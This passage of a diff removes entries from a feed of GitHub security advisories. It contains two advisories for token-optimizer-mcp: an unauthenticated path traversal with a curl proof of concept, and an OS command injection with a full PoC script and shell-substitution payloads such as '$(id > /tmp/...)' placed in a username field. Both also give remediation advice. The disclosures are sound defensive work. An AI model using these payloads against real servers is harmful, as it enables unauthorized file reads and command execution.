-<li><a href="https://github.com/RebeccaStevens/deepmerge-ts/security/advisories/GHSA-ggr8-5vv4-36mx">https://github.com/RebeccaStevens/deepmerge-ts/security/advisories/GHSA-ggr8-5vv4-36mx</a></li>
-<li><a href="https://github.com/RebeccaStevens/deepmerge-ts/releases/tag/v8.0.0">https://github.com/RebeccaStevens/deepmerge-ts/releases/tag/v8.0.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-ggr8-5vv4-36mx">https://github.com/advisories/GHSA-ggr8-5vv4-36mx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ggr8-5vv4-36mx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-17T13:32:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@ooples/token-optimizer-mcp] Token Optimizer MCP: Unauthenticated Path Traversal in Dashboard Session Log API Endpoints]]></title>
-        <id>https://github.com/advisories/GHSA-76pc-mqxp-3rq5</id>
-        <link href="https://github.com/advisories/GHSA-76pc-mqxp-3rq5"/>
-        <updated>2026-08-14T21:43:56.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="unauthenticated-path-traversal-in-dashboard-session-log-api-endpoints">Unauthenticated Path Traversal in Dashboard Session Log API Endpoints</h1>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Repository</td>
-<td>ooples/token-optimizer-mcp</td>
-</tr>
-<tr>
-<td>Affected version</td>
-<td>5.0.1 (commit 8137147)</td>
-</tr>
-<tr>
-<td>Vulnerability</td>
-<td>CWE-22 — Improper Limitation of a Pathname to a Restricted Directory</td>
-</tr>
-<tr>
-<td>Severity</td>
-<td>Medium</td>
-</tr>
-<tr>
-<td>CVSS 3.1</td>
-<td>5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)</td>
-</tr>
-</tbody></table>
-<h2 id="summary">Summary</h2>
-<p>The dashboard HTTP server in <code>token-optimizer-mcp</code> exposes <code>/api/session-summary</code> and <code>/api/session-events</code> with no authentication middleware — any network-accessible client can reach them without credentials. Both handlers concatenate the caller-supplied <code>sessionId</code> query parameter directly into a filesystem path via <code>path.join</code>, and Node.js normalizes <code>..</code> segments at resolution time, allowing an unauthenticated attacker to read any <code>.jsonl</code> file reachable from the server's filesystem. Successful reproduction confirmed exfiltration of a <code>.jsonl</code> file located outside the intended <code>hooksDataPath</code> directory with a single unauthenticated HTTP GET request.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><code>src/server/web-server.ts:73–88</code> — <code>/api/session-summary</code>: unsanitized <code>sessionId</code> interpolated into <code>path.join</code> then passed to <code>fs.readFileSync</code></p>
-<pre><code class="language-typescript">    const hooksDataPath = getHooksDataPath();
-    const jsonlFilePath = path.join(
-      hooksDataPath,
-      `session-log-${sessionId}.jsonl`
-    );
-
-    if (!fs.existsSync(jsonlFilePath)) {
-      return res.status(404).json({
-        success: false,
-        error: `JSONL log not found for session ${sessionId}`,
-        sessionId,
-      });
-    }
-
-    // Parse JSONL file
-    const jsonlContent = fs.readFileSync(jsonlFilePath, 'utf-8');
-</code></pre>
-<p><code>src/server/web-server.ts:297–311</code> — <code>/api/session-events</code>: identical unsanitized <code>path.join</code> + <code>fs.readFileSync</code> pattern</p>
-<pre><code class="language-typescript">    const hooksDataPath = getHooksDataPath();
-    const jsonlFilePath = path.join(
-      hooksDataPath,
-      `session-log-${sessionId}.jsonl`
-    );
-
-    if (!fs.existsSync(jsonlFilePath)) {
-      return res.status(404).json({
-        success: false,
-        error: `JSONL log not found for session ${sessionId}`,
-      });
-    }
-
-    // Parse JSONL file
-    const jsonlContent = fs.readFileSync(jsonlFilePath, 'utf-8');
-</code></pre>
-<p><code>req.query.sessionId</code> flows unsanitized into <code>path.join(hooksDataPath, \</code>session-log-${sessionId}.jsonl`)<code>, which Node.js resolves by normalizing </code>..<code>traversal sequences before the</code>fs.readFileSync` call.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Step 1 — Send traversal payload to <code>/api/session-events</code> with no credentials: server returns HTTP 200 with contents of a <code>.jsonl</code> file outside <code>hooksDataPath</code> — proves unauthenticated out-of-bounds file read.</p>
-<pre><code class="language-bash">curl -s "http://127.0.0.1:3100/api/session-events?sessionId=abc%2F..%2F..%2F..%2F..%2Ftraversal-target"
-</code></pre>
-<pre><code class="language-http">GET /api/session-events?sessionId=abc%2F..%2F..%2F..%2F..%2Ftraversal-target HTTP/1.1
-Host: 127.0.0.1:3100
-User-Agent: python-requests/2.x
-Accept: */*
-</code></pre>
-<pre><code class="language-http">HTTP/1.1 200 OK
-X-Powered-By: Express
-Access-Control-Allow-Origin: *
-Content-Type: application/json; charset=utf-8
-Content-Length: 186
-
-{"success":true,"sessionId":"abc/../../../../traversal-target","total":1,"offset":0,"limit":100,"events":[{"type":"PATH_TRAVERSAL_EVIDENCE","secret":"sensitive-data-outside-hooks-dir"}]}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An unauthenticated remote attacker can read the contents of any <code>.jsonl</code> file accessible to the process running the dashboard server. In a typical deployment this includes all session log files (which contain tool invocations, hook outputs, and token usage data) as well as any other <code>.jsonl</code> file reachable via <code>..</code> traversal from <code>hooksDataPath</code>. The constraint that the resolved path must end in <code>.jsonl</code> limits the attack surface to that file extension, but session logs can contain sensitive operational data. The same path traversal is present in both <code>/api/session-summary</code> and <code>/api/session-events</code>, and neither endpoint requires authentication.</p>
-<h2 id="remediation">Remediation</h2>
-<ol>
-<li><p><strong>Validate <code>sessionId</code> format</strong> before use: reject any value that does not match a strict allowlist such as <code>/^[a-zA-Z0-9_-]{1,64}$/</code>. This prevents <code>/</code> and <code>.</code> characters from entering the path construction entirely.</p>
-<pre><code class="language-typescript">const SESSION_ID_RE = /^[a-zA-Z0-9_-]{1,64}$/;
-if (!SESSION_ID_RE.test(sessionId)) {
-  return res.status(400).json({ success: false, error: 'Invalid sessionId' });
-}
-</code></pre>
-</li>
-<li><p><strong>Alternatively, apply <code>path.basename</code></strong> to strip all directory components: <code>path.basename(sessionId)</code> reduces any traversal sequence to a bare filename before <code>path.join</code>.</p>
-</li>
-<li><p><strong>Add authentication middleware</strong> to all <code>/api/*</code> routes so that even if a bypass is found the endpoints are not reachable without a valid session token.</p>
-</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-76pc-mqxp-3rq5">https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-76pc-mqxp-3rq5</a></li>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7">https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7</a></li>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0">https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-76pc-mqxp-3rq5">https://github.com/advisories/GHSA-76pc-mqxp-3rq5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-76pc-mqxp-3rq5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-14T21:43:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@ooples/token-optimizer-mcp] Token Optimizer MCP: OS command injection in smart_user via username in get-user-info]]></title>
-        <id>https://github.com/advisories/GHSA-49mq-fc6q-3h46</id>
-        <link href="https://github.com/advisories/GHSA-49mq-fc6q-3h46"/>
-        <updated>2026-08-14T21:42:06.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>token-optimizer-mcp</code> is vulnerable to OS command injection in the <code>smart_user</code> tool.</p>
-<p>The <code>get-user-info</code> operation accepts a user-controlled <code>username</code> argument and later interpolates it into a shell command executed through <code>execAsync()</code>:</p>
-<pre><code class="language-ts">getent passwd "${username}" || grep "^${username}:" /etc/passwd
-</code></pre>
-<p>Although the value is wrapped in double quotes, POSIX shells still evaluate command substitution such as <code>$(...)</code> and backticks inside double quotes. As a result, an MCP client can provide a crafted username such as:</p>
-<pre><code class="language-text">$(id &gt; /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)
-</code></pre>
-<p>and execute arbitrary local commands with the privileges of the user running the MCP server.</p>
-<p>This is a CWE-78 OS command injection issue.</p>
-<p>Tested version:</p>
-<pre><code class="language-text">@ooples/token-optimizer-mcp v5.0.1
-MCP serverInfo.name: token-optimizer-mcp
-MCP serverInfo.version: 0.2.0
-</code></pre>
-<p>This issue is not related to the current <code>npm audit</code> dependency advisories. The vulnerability is in <code>token-optimizer-mcp</code>'s own tool implementation.</p>
-<hr>
-<h3 id="details">Details</h3>
-<p>The vulnerable code path is in the <code>smart_user</code> implementation.</p>
-<p>The <code>username</code> argument is eventually passed into a shell command similar to:</p>
-<pre><code class="language-ts">const { stdout: passwdOut } = await execAsync(
-  `getent passwd "${username}" || grep "^${username}:" /etc/passwd`
-);
-</code></pre>
-<p>The problem is that <code>username</code> is controlled by the MCP tool caller and is inserted into a command string executed by a shell.</p>
-<p>Double quotes do not make this safe. In POSIX shells, command substitution is still evaluated inside double quotes:</p>
-<pre><code class="language-bash">"$(id &gt; /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)"
-"`id`"
-</code></pre>
-<p>Therefore, a malicious <code>username</code> can execute arbitrary commands before <code>getent</code> or <code>grep</code> receives its arguments.</p>
-<p>The affected MCP tool call is:</p>
-<pre><code class="language-text">tool: smart_user
-operation: get-user-info
-argument: username
-</code></pre>
-<p>Root cause:</p>
-<pre><code class="language-text">MCP-controlled username
-→ interpolated into shell command string
-→ executed through execAsync()
-→ shell evaluates $(...) / backticks
-→ arbitrary command execution
-</code></pre>
-<hr>
-<h3 id="poc">PoC</h3>
-<p>The following PoC runs a harmless <code>id</code> command and writes the result to a temporary file under <code>/tmp</code>.</p>
-<p>Prerequisites:</p>
-<pre><code class="language-text">Node.js installed
-token-optimizer-mcp built from source
-</code></pre>
-<p>Build from source:</p>
-<pre><code class="language-bash">git clone https://github.com/ooples/token-optimizer-mcp.git
-cd token-optimizer-mcp
-npm install
-npm run build
-</code></pre>
-<p>Run the PoC:</p>
-<pre><code class="language-bash">cd /path/to/token-optimizer-mcp
-
-ENTRY=dist/server/index.js
-ID_OUT="/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_$(date +%s)_$$"
-rm -f "$ID_OUT"
-
-echo "[*] ENTRY=$ENTRY"
-echo "[*] id output file: $ID_OUT"
-
-python3 - "$ID_OUT" &lt;&lt;'PY' | timeout 20 node "$ENTRY" 2&gt;&amp;1 | tee /tmp/token_optimizer_smart_user_poc.log
-import json
-import sys
-
-id_out = sys.argv[1]
-
-# This value is inserted into:
-# getent passwd "${username}" || grep "^${username}:" /etc/passwd
-# Command substitution still executes inside double quotes.
-evil_username = f'$(id &gt; {id_out})'
-
-messages = [
-    {
-        "jsonrpc": "2.0",
-        "id": "init",
-        "method": "initialize",
-        "params": {
-            "protocolVersion": "2024-11-05",
-            "capabilities": {},
-            "clientInfo": {
-                "name": "poc",
-                "version": "0"
-            }
-        }
-    },
-    {
-        "jsonrpc": "2.0",
-        "method": "notifications/initialized",
-        "params": {}
-    },
-    {
-        "jsonrpc": "2.0",
-        "id": "poc-smart-user",
-        "method": "tools/call",
-        "params": {
-            "name": "smart_user",
-            "arguments": {
-                "operation": "get-user-info",
-                "username": evil_username,
-                "useCache": False
-            }
-        }
-    }
-]
-
-for msg in messages:
-    print(json.dumps(msg), flush=True)
-PY
-
-sleep 1
-
-if [ -f "$ID_OUT" ]; then
-  echo "[VULN CONFIRMED] smart_user command injection executed:"
-  cat "$ID_OUT"
-  ls -l "$ID_OUT"
-else
-  echo "[FAIL] smart_user id output file not created"
-  tail -120 /tmp/token_optimizer_smart_user_poc.log
-fi
-</code></pre>
-<p>Expected result:</p>
-<pre><code class="language-text">[VULN CONFIRMED] smart_user command injection executed:
-uid=1001(&lt;local-user&gt;) gid=1001(&lt;local-user&gt;) groups=...
--rw-rw-r-- 1 &lt;local-user&gt; &lt;local-user&gt; ... /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...
-</code></pre>
-<p>In my test, the MCP response also showed that the payload reached the shell command:</p>
-<pre><code class="language-text">Command failed: getent passwd "$(id &gt; /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...)" || grep "^$(id &gt; /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...):" /etc/passwd
-</code></pre>
-<p>The file <code>/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...</code> was created and contained the output of <code>id</code>, confirming command execution as the MCP server user.</p>
-<p>A simpler marker-file variant also works:</p>
-<pre><code class="language-json">{
-  "operation": "get-user-info",
-  "username": "$(touch /tmp/TOKEN_OPTIMIZER_SMART_USER_PWNED)",
-  "useCache": false
-}
-</code></pre>
-<hr>
-<h3 id="impact">Impact</h3>
-<p>This is an OS command injection vulnerability.</p>
-<p>Any MCP client that can call the <code>smart_user</code> tool can execute arbitrary shell commands through the <code>username</code> argument of the <code>get-user-info</code> operation.</p>
-<p>The commands execute with the privileges of the user running the <code>token-optimizer-mcp</code> server.</p>
-<p>Confirmed impact:</p>
-<pre><code class="language-text">execution of `id` as the MCP server user
-arbitrary file creation under /tmp through an injected command
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-49mq-fc6q-3h46">https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-49mq-fc6q-3h46</a></li>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7">https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7</a></li>
-<li><a href="https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0">https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-49mq-fc6q-3h46">https://github.com/advisories/GHSA-49mq-fc6q-3h46</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-49mq-fc6q-3h46</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-14T21:42:06.000Z</published>
     </entry>
 </feed>
